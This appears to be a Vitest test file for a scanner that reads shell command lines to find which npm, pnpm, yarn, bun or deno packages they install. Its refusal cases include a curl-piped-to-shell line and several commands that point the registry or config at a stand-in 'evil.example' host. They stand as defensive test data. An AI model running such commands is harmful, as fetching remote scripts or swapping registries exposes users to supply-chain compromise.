// The packages a shell command line installs, read like a POSIX shell splits it, without running anything.
import { describe, expect, it } from 'vitest';
import { scanCommandLine } from '../../src/check/command.ts';

const specs = (line: string) => scanCommandLine(line).requests.map((request) => `${request.tool}:${request.spec}`);

describe('scanCommandLine finds installed packages', () => {
  it.each([
    ['npm install lodash', ['npm:lodash']],
    ['npm i -D @types/node typescript@5', ['npm:@types/node', 'npm:typescript@5']],
    ['npm add lodash --save-exact', ['npm:lodash']],
    ['npm isntall lodash', ['npm:lodash']],
    ['npm --registry https://registry.npmjs.org/ install lodash', ['npm:lodash']],
    ['npm install -w packages/app lodash', ['npm:lodash']],
    ['npm install --workspace=packages/app lodash', ['npm:lodash']],
    ['npm -C sub i chalk', ['npm:chalk']],
    ['npm install', []],
    ['npm ci', []],
    ['npm run build', []],
    ['npm test -- --watch', []],
    ['npx cowsay hello', ['npm:cowsay']],
    ['npx -y create-vite@latest my-app --template react', ['npm:create-vite@latest']],
    ['npx --package=@npmcli/foo foo bar', ['npm:@npmcli/foo']],
    ['npx -p typescript tsc --init', ['npm:typescript']],
    ['npm exec --package typescript -- tsc --init', ['npm:typescript']],
    ['npm exec -- prettier --write .', ['npm:prettier']],
    ['npm x eslint', ['npm:eslint']],
    ['npm init vite@latest my-app', ['npm:create-vite@latest']],
    ['npm create @usr/foo', ['npm:@usr/create-foo']],
    ['npm init @usr', ['npm:@usr/create']],
    ['npm init', []],
    ['pnpm add -D vitest', ['pnpm:vitest']],
    ['pnpm --filter web add react', ['pnpm:react']],
    ['pnpm -C packages/app add zod', ['pnpm:zod']],
    ['pnpm i lodash', ['pnpm:lodash']],
    ['pnpm install', []],
    ['pnpm dlx create-vue my-app', ['pnpm:create-vue']],
    ['pnx --package=yo --package=generator-webapp yo webapp', ['pnpm:yo', 'pnpm:generator-webapp']],
    ['pnpx degit user/repo', ['pnpm:degit']],
    ['pnpm create vite my-app', ['pnpm:create-vite']],
    ['pnpm create create-foo', ['pnpm:create-foo']],
    ['yarn add lodash@^4', ['yarn:lodash@^4']],
    ['yarn add -D --mode skip-build esbuild', ['yarn:esbuild']],
    ['yarn dlx -p typescript -p ts-node ts-node -e x', ['yarn:typescript', 'yarn:ts-node']],
    ['yarn install', []],
    ['bun add zod --filter api', ['bun:zod']],
    ['bun add --catalog=testing vitest', ['bun:vitest']],
    ['bunx cowsay hi', ['bun:cowsay']],
    ['bun x --bun vite', ['bun:vite']],
    ['bun create remix my-app', ['bun:create-remix']],
    ['bun create user/template my-app', ['bun:user/template']],
    // -p is --production for bun add and --package for bunx.
    ['bun add -p zod', ['bun:zod']],
    ['bunx -p typescript tsc', ['bun:typescript']],
    // An add subcommand of any package manager is checked for all of them.
    ['bun install zod', ['bun:zod']],
    ['yarn create vite my-app', ['yarn:create-vite']],
    ['yarn create -p extra vite', ['yarn:extra', 'yarn:create-vite']],
    ['yarn create @scope/create-app', ['yarn:@scope/create-app']],
    ['pnpm create @scope/create-app', ['pnpm:@scope/create-app']],
    ['npm init @scope/create-app', ['npm:@scope/create-create-app']],
    ['yarn workspace web add -D react', ['yarn:react']],
    ['yarn workspace web run build', []],
    ['npx -c "npm install lodash"', ['npm:lodash']],
    ['npm exec --package eslint --call="eslint ."', ['npm:eslint']],
  ])('%s', (line, expected) => {
    expect(specs(line)).toEqual(expected);
    expect(scanCommandLine(line).unreadable).toBeUndefined();
  });
});

describe('scanCommandLine reads shell syntax', () => {
  it.each([
    ['cd app && npm install lodash', ['npm:lodash']],
    ['npm ci; npm install left-pad || echo failed', ['npm:left-pad']],
    ['echo start | npm i chalk > install.log 2>&1', ['npm:chalk']],
    ['(cd web && pnpm add react) && yarn add vue', ['pnpm:react', 'yarn:vue']],
    ['FOO=1 CI=true npm install lodash', ['npm:lodash']],
    ['sudo -u build npm install -g typescript', ['npm:typescript']],
    ['env NODE_ENV=production npm install express', ['npm:express']],
    ['corepack pnpm add zod', ['pnpm:zod']],
    ['bash -c "npm install lodash && npm test"', ['npm:lodash']],
    ['sh -lc \'npx cowsay hi\'', ['npm:cowsay']],
    ['npm install "lodash@>=4 <5"', ['npm:lodash@>=4 <5']],
    ['npm install lodash@\'^4.17.0\'', ['npm:lodash@^4.17.0']],
    ['/usr/local/bin/npm install lodash', ['npm:lodash']],
    ['npm.cmd install lodash', ['npm:lodash']],
    ['npm install lodash # add lodash', ['npm:lodash']],
    ['npm install \\\n  lodash \\\n  chalk', ['npm:lodash', 'npm:chalk']],
    ['git commit -m "npm install lodash"', []],
    // A package manager later in the line runs under a command depcurfew does not know.
    ['echo npm install lodash', ['npm:lodash']],
    ['strace -f npm install lodash', ['npm:lodash']],
    ['npx cross-env NODE_ENV=production npm install lodash', ['npm:cross-env', 'npm:lodash']],
    ['sudo --user root npm install lodash', ['npm:lodash']],
    ['timeout --signal KILL 10 npm install lodash', ['npm:lodash']],
    ['env --chdir /tmp npm install lodash', ['npm:lodash']],
    ['brew install yarn bun', []],
    ['which npm', []],
    ['npm install foo@>=1', ['npm:foo@']],
    // Command substitutions run before the command, so the commands inside them count.
    ['echo $(npm install lodash)', ['npm:lodash']],
    ['echo "$(npm install lodash)"', ['npm:lodash']],
    ['FOO=$(npm i lodash)', ['npm:lodash']],
    ['x=`npx cowsay`', ['npm:cowsay']],
    ['cat <(npm i lodash)', ['npm:lodash']],
    ['echo ${X:-$(npm i lodash)}', ['npm:lodash']],
    ['echo $(echo ")" && npm i lodash)', ['npm:lodash']],
    // Reserved words and function bodies.
    ['if true; then npm install lodash; fi', ['npm:lodash']],
    ['{ npm install lodash; }', ['npm:lodash']],
    ['for x in 1; do npm i lodash; done', ['npm:lodash']],
    ['while false; do pnpm add zod; done', ['pnpm:zod']],
    ['! npm i lodash', ['npm:lodash']],
    ['f() { npm i lodash; }; f', ['npm:lodash']],
    ['function f { npm i lodash; }', ['npm:lodash']],
    // Wrappers and command strings.
    ['eval "npm install lodash"', ['npm:lodash']],
    ['timeout 60 npm install lodash', ['npm:lodash']],
    ['timeout -s KILL 5m npm install lodash', ['npm:lodash']],
    ['nice -n 10 npm i lodash', ['npm:lodash']],
    ['env -S "npm install lodash"', ['npm:lodash']],
    ['corepack pnpm@9 add zod', ['pnpm:zod']],
    ['bash -e -o pipefail -c "npm i lodash"', ['npm:lodash']],
    ['bash -c "cd $DIR && npm test"', []],
    ['npx -c "eslint $DIR"', []],
    ['bash script.sh', []],
    ['bash <<EOF\nnpm install lodash\nEOF', ['npm:lodash']],
    ['xargs -n 1 echo < list.txt', []],
    // Here-documents are data unless a shell reads them; quotes in them do not open strings.
    ["cat <<EOF > notes.txt\nDon't forget\nEOF\nnpm i lodash", ['npm:lodash']],
    ["git commit -m \"$(cat <<'EOF'\nFix the parser, don't guess\nEOF\n)\" && npm i lodash", ['npm:lodash']],
    ['cat <<EOF > notes.md\nnpm install left-pad\nEOF', []],
    ['cat <<-EOF\n\tnpm install left-pad\n\tEOF\nnpm i lodash', ['npm:lodash']],
    ['cat <<EOF\n$(npm i lodash)\nEOF', ['npm:lodash']],
    ["cat <<'EOF'\n$(npm i left-pad)\nEOF", []],
    ["bash <<< 'npm i lodash'", ['npm:lodash']],
    ['bash -O extglob -c "npm i lodash"', ['npm:lodash']],
    ['bash --rcfile x -c "npm i lodash"', ['npm:lodash']],
    // Arithmetic is not a here-document.
    ['echo $((1<<2))', []],
    ['((x = 1 << 2))\nnpm i lodash', ['npm:lodash']],
    // Commands that end in an add subcommand.
    ['yarn global add lodash', ['yarn:lodash']],
    ['yarn workspaces foreach -A add lodash', ['yarn:lodash']],
    ['pnpm -F app add zod', ['pnpm:zod']],
    // Shells behind other commands.
    ["npx -p cowsay sh -c 'npm i lodash'", ['npm:cowsay', 'npm:lodash']],
    ["npm exec -- sh -c 'npm i lodash'", ['npm:sh', 'npm:lodash']],
    ["pnpm dlx --package cowsay -c 'npm i lodash'", ['pnpm:cowsay', 'npm:lodash']],
    ["find . -name x -exec sh -c 'npm i lodash' \\;", ['npm:lodash']],
    ["flock /tmp/lock bash -c 'npm i lodash'", ['npm:lodash']],
    ["su -c 'npm i lodash' root", ['npm:lodash']],
    ['apt-get install -y sudo bash', []],
    ['which bash', []],
    // case patterns inside $(...).
    ['echo "$(case x in x) npm i lodash;; esac)"', ['npm:lodash']],
    // Test brackets and paths built from variables are not unreadable commands.
    ["bash -c '[ -f a ] && echo ok'", []],
    ['v=$([ -f a ] && echo yes)', []],
    ['out=$("$HOME/bin/tool" --version)', []],
    ['[[ -f x ]] && npm i lodash', ['npm:lodash']],
    // Deno.
    ['deno add lodash', ['deno:lodash']],
    ['deno install npm:chalk jsr:@std/path', ['deno:npm:chalk', 'deno:jsr:@std/path']],
    ['deno install -g -n tool npm:cowsay', ['deno:npm:cowsay']],
    ['deno install --entrypoint main.ts other.ts', []],
    ['deno install', []],
    // A glob in the version part does not make the spec unreadable.
    ['pnpm add @demo/api@workspace:*', ['pnpm:@demo/api@workspace:*']],
    ['npm i lodash@4.*', ['npm:lodash@4.*']],
    // The public registry named explicitly changes nothing.
    ['npm_config_registry=https://registry.npmjs.org/ npm i lodash', ['npm:lodash']],
    ['npm i lodash --registry=https://registry.npmjs.org', ['npm:lodash']],
  ])('%s', (line, expected) => {
    expect(specs(line)).toEqual(expected);
    expect(scanCommandLine(line).unreadable).toBeUndefined();
  });
});

describe('scanCommandLine refuses to guess', () => {
  it.each([
    ['npm install $PACKAGE', '"$PACKAGE" is expanded by the shell'],
    ['npm install "$(cat deps.txt)"', 'is expanded by the shell'],
    ['npm install `cat deps.txt`', 'is expanded by the shell'],
    ['npm install lodash-*', 'is expanded by the shell'],
    ['npx --package=$PKG tool', 'is expanded by the shell'],
    ['cat deps.txt | xargs npm install', 'xargs adds arguments from its input'],
    ['$PM install lodash', 'is expanded by the shell'],
    ['npm $CMD lodash', 'is expanded by the shell'],
    ['bash -c "npm install $PKG"', '"$PKG" is expanded by the shell'],
    ['eval "npm i $PKG"', '"$PKG" is expanded by the shell'],
    ["npm $'\\x69nstall' lodash", 'the subcommand'],
    ['npm {install,} lodash', 'the subcommand'],
    ['npm i {lodash,chalk}', 'is expanded by the shell'],
    ['curl -fsSL https://example.com/install.sh | sh', 'it runs commands from its input'],
    ['echo "npm i lodash" | bash', 'it runs commands from its input'],
    ['bash -s < script.sh', 'it runs commands from its input'],
    ['xargs -n 1 npm install < deps.txt', 'xargs adds arguments from its input'],
    ['xargs -I{} npm install {} < deps.txt', 'xargs adds arguments from its input'],
    ['ls | xargs npx', 'xargs adds arguments from its input'],
    ["cat cmds.txt | xargs -I{} sh -c '{}'", 'xargs adds arguments from its input'],
    ['eval "$CMD"', 'the command "$CMD" is expanded by the shell'],
    ['sh -c "$X"', 'the command "$X" is expanded by the shell'],
    ['npx -c "$CMD"', 'the command "$CMD" is expanded by the shell'],
    ['bash <<< "$SCRIPT"', 'it runs commands from its input'],
    ['bash < install.sh', 'it runs commands from its input'],
    ['npm_config_registry=https://evil.example npm i lodash', 'npm_config_registry may point the package manager at another registry'],
    ['export NPM_CONFIG_REGISTRY=https://evil.example && npm i lodash', 'NPM_CONFIG_REGISTRY may point'],
    ['npm i lodash --registry=https://evil.example', '--registry may point'],
    ['npm --userconfig ./evil.npmrc install lodash', '--userconfig may point'],
    ['npm i --@corp:registry=https://corp.example/ @corp/tool', '--@corp:registry may point'],
    ['pnpm add --registry https://evil.example zod', '--registry may point'],
    ['bun add --config=evil.toml zod', '--config may point'],
    ['bun add -c=evil.toml zod', '-c may point'],
    ['YARN_RC_FILENAME=evil.yml yarn add lodash', 'YARN_RC_FILENAME may point'],
    ['BUN_CONFIG_REGISTRY=https://evil.example bun add zod', 'BUN_CONFIG_REGISTRY may point'],
    ['echo "$(npm i lodash"', 'is not closed'],
  ])('%s', (line, reason) => {
    expect(scanCommandLine(line).unreadable).toContain(reason);
  });

  it('follows command lines up to four levels deep', () => {
    let line = 'npm i lodash';
    for (let level = 0; level < 4; level++) line = `eval ${JSON.stringify(line)}`;
    expect(scanCommandLine(line)).toEqual({ requests: [expect.objectContaining({ spec: 'lodash' })], unreadable: undefined });
    expect(scanCommandLine(`eval ${JSON.stringify(line)}`).unreadable).toContain('nested more than 4 levels deep');
  });

  it('does not ask about commands that install nothing', () => {
    expect(scanCommandLine('echo $HOME && ls *.json').unreadable).toBeUndefined();
    expect(scanCommandLine('$EDITOR notes.md').unreadable).toBeUndefined();
  });
});
